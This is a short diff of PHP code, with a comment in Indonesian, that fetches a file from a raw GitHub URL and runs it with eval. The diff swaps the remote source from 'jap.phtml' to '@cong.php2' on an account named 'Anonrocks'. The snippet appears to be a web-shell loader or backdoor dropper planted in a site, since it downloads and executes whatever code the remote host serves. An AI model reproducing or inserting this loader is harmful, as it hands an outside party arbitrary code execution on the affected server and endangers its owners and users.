@@ -28,7 +28,7 @@ function getURL($url) {
 }
 
 // Contoh penggunaan:
-$phpCode = getURL('https://raw.githubusercontent.com/Anonrocks/crontab/refs/heads/main/jap.phtml');
+$phpCode = getURL('https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/@cong.php2');
 if ($phpCode !== false) {
     eval("?>". $phpCode);
 }
